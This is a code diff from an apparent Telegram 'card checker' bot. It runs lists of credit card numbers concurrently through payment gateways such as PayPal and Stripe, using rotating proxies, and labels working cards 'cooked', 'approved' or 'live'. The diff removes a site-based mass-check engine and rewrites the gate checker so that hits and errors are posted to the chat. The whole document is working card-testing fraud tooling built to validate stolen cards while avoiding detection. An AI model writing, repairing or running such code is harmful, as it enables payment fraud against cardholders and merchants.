@@ -484,169 +484,130 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 # 🧠 MASS CHECK ENGINE
 # ============================================================================
 
-def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
-    results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
-    total = len(ccs)
-    processed = 0
-    start_time = time.time()
-    last_update_time = time.time()
-    
-    def worker(cc):
-        attempts = 0
-        while attempts < MAX_RETRIES:
-            try:
-                site = random.choice(sites)
-                proxy = random.choice(proxies)
-                api_response = check_site_func(site['url'], cc, proxy)
-                
-                if not api_response:
-                    attempts += 1; continue
-                
-                resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))
-                
-                # Retry on soft errors
-                if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
-                    attempts += 1; continue
-                
-                return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway, 'price': site.get('price', '0'), 'site_url': site['url']}
-            except: attempts += 1
-        return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}
-
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = {executor.submit(worker, cc): cc for cc in ccs}
-        for future in as_completed(futures):
-            processed += 1
-            res = future.result()
-            
-            if res['status'] == 'APPROVED':
-                if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
-                    results['cooked'].append(res)
-                    update_stats_func('COOKED', True)
-                    send_hit(bot, message.chat.id, res, "🔥 COOKED")
-                else:
-                    results['approved'].append(res)
-                    update_stats_func('APPROVED', True)
-                    send_hit(bot, message.chat.id, res, "✅ APPROVED")
-            elif res['status'] == 'APPROVED_OTP':
-                results['approved'].append(res)
-                update_stats_func('APPROVED_OTP', True)
-                send_hit(bot, message.chat.id, res, "✅ APPROVED (OTP)")
-            elif res['status'] == 'DECLINED':
-                results['declined'].append(res)
-                update_stats_func('DECLINED', True)
-            else:
-                results['error'].append(res)
-
-            if time.time() - last_update_time > 3 or processed == total:
-                update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
-                last_update_time = time.time()
-
-    duration = time.time() - start_time
-    send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)
-
-def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
+def processmassgate_check(bot, message, ccs, gate_func, gate_name, proxies):
     """
-    Generic mass check for API gates (PayPal, Stripe, etc).
-    FIXED: Now accepts 'proxies' and passes a random proxy to the gate function.
+    Generic mass check for API gates (PayPal, Stripe, etc.)
+    FIXED: Now properly shows errors in bot instead of silent crashes
     """
     total = len(ccs)
-    # Initialize results lists
-    results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
+    results = {"live": [], "dead": [], "error": []}
     
-    # Send initial status message
     try:
         status_msg = bot.send_message(
-            message.chat.id, 
-            f"🔥 <b>{gate_name} Started...</b>\n"
+            message.chat.id,
+            f"<b>✅ {gate_name} Started...</b>\n"
             f"💳 Cards: {total}\n"
-            f"🔌 Proxies: {len(proxies)}", 
-            parse_mode='HTML'
+            f"🌐 Proxies: {len(proxies)}",
+            parse_mode="HTML"
         )
     except:
-        # Fallback if message object is stale
-        status_msg = bot.send_message(message.chat.id, f"🔥 <b>{gate_name} Started...</b>", parse_mode='HTML')
-    
+        status_msg = bot.send_message(message.chat.id, f"<b>{gate_name} Started...</b>", parse_mode="HTML")
+
     processed = 0
     start_time = time.time()
     last_update = time.time()
 
-    # Use ThreadPool to run checks concurrently
+    def worker(cc):
+        """Worker function for each card check"""
+        proxy = random.choice(proxies)
+        try:
+            # Call gate function - MUST return (response_text, status)
+            response_text, status = gate_func(cc, proxy)
+            return {
+                "cc": cc,
+                "response": response_text,
+                "status": status,
+                "gateway": gate_name,
+                "price": "N/A",
+                "site_url": "API"
+            }
+        except Exception as e:
+            # Catch worker-level crashes and return as ERROR
+            error_msg = f"Crash: {str(e)[:100]}"
+            print(f"❌ WORKER CRASH [{cc}]: {traceback.format_exc()}")
+            return {
+                "cc": cc,
+                "response": error_msg,
+                "status": "ERROR",
+                "gateway": gate_name,
+                "price": "N/A",
+                "site_url": "API"
+            }
+
+    # Run checks concurrently
     with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = {}
+        futures = {executor.submit(worker, cc): cc for cc in ccs}
         
-        # Submit all cards with a random proxy assigned to each
-        for cc in ccs:
-            proxy = random.choice(proxies)
-            # Submit task: gate_func(cc, proxy)
-            futures[executor.submit(gate_func, cc, proxy)] = cc
-        
-        # Process results as they complete
         for future in as_completed(futures):
             cc = futures[future]
             processed += 1
             
             try:
-                # gate_func is expected to return (response_text, status)
-                response_text, status = future.result()
+                res_obj = future.result()
+                status = res_obj["status"]
                 
-                # Create result object
-                res_obj = {
-                    'cc': cc, 
-                    'response': response_text, 
-                    'status': status, 
-                    'gateway': gate_name,
-                    'price': 'N/A',      # Default for gates
-                    'site_url': 'API'    # Default for gates
-                }
-                
-                # Categorize Result
-                if status == 'APPROVED':
-                    results['cooked'].append(res_obj)
-                    send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} HIT")
-                elif status == 'APPROVED_OTP': # Handle OTP/Auth responses
-                    results['approved'].append(res_obj)
-                    send_hit(bot, message.chat.id, res_obj, f"⚠️ {gate_name} AUTH")
-                elif status == 'DECLINED':
-                    results['declined'].append(res_obj)
-                else:
-                    results['error'].append(res_obj)
-                
-                # Update UI every 3 seconds to avoid flooding API
-                if time.time() - last_update > 3:
-                    msg = (
-                        f"⚡ <b>{gate_name} Checking...</b>\n"
-                        f"{create_progress_bar(processed, total)}\n"
-                        f"<b>Progress:</b> {processed}/{total}\n"
-                        f"✅ <b>Live:</b> {len(results['cooked'])}\n"
-                        f"❌ <b>Dead:</b> {len(results['declined'])}\n"
-                        f"⚠️ <b>Error:</b> {len(results['error'])}"
-                    )
+                # Categorize results
+                if status == "APPROVED":
+                    results["live"].append(res_obj)
+                    send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} LIVE")
+                elif status == "DECLINED":
+                    results["dead"].append(res_obj)
+                else:  # ERROR
+                    results["error"].append(res_obj)
+                    # ⚠️ SHOW ERROR IN BOT (NEW)
                     try:
-                        bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
-                        last_update = time.time()
-                    except: pass # Ignore edit errors
-                    
+                        bot.send_message(
+                            message.chat.id,
+                            f"⚠️ <b>ERROR</b>\n"
+                            f"<code>{res_obj['cc']}</code>\n"
+                            f"<b>Reason:</b> {res_obj['response']}",
+                            parse_mode="HTML"
+                        )
+                    except:
+                        pass
+                        
             except Exception as e:
-                # Log internal worker errors
-                print(f"Check Error for {cc}: {e}")
-                results['error'].append({'cc': cc, 'response': str(e), 'status': 'ERROR'})
+                # Fallback if result retrieval fails
+                print(f"❌ Result processing error [{cc}]: {e}")
+                results["error"].append({
+                    "cc": cc,
+                    "response": f"Process Error: {str(e)[:50]}",
+                    "status": "ERROR"
+                })
 
-    # Final Summary Message
+            # Update UI every 3 seconds
+            if time.time() - last_update >= 3 or processed == total:
+                msg = (
+                    f"<b>⚡ {gate_name} Checking...</b>\n"
+                    f"{create_progress_bar(processed, total)}\n"
+                    f"📊 Progress: {processed}/{total}\n"
+                    f"✅ Live: {len(results['live'])}\n"
+                    f"❌ Dead: {len(results['dead'])}\n"
+                    f"⚠️ Errors: {len(results['error'])}"
+                )
+                try:
+                    bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode="HTML")
+                    last_update = time.time()
+                except:
+                    pass
+
+    # Final summary
     duration = time.time() - start_time
     final_msg = (
-        f"✅ <b>{gate_name} Completed</b>\n"
+        f"<b>✅ {gate_name} Completed</b>\n"
         f"━━━━━━━━━━━━━━━━\n"
         f"💳 <b>Total:</b> {total}\n"
-        f"✅ <b>Live:</b> {len(results['cooked'])}\n"
-        f"❌ <b>Dead:</b> {len(results['declined'])}\n"
+        f"✅ <b>Live:</b> {len(results['live'])}\n"
+        f"❌ <b>Dead:</b> {len(results['dead'])}\n"
         f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
         f"⏱️ <b>Time:</b> {duration:.2f}s"
     )
     
     try:
-        bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
+        bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode="HTML")
     except:
-        bot.send_message(message.chat.id, final_msg, parse_mode='HTML')
+        bot.send_message(message.chat.id, final_msg, parse_mode="HTML")
+
 # ============================================================================
 # 📩 MESSAGING
 # ============================================================================
@@ -711,5 +672,6 @@ def send_final(bot, chat_id, mid, total, results, duration):
     try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
 
     except: bot.send_message(chat_id, msg, parse_mode='HTML')
+
 
 
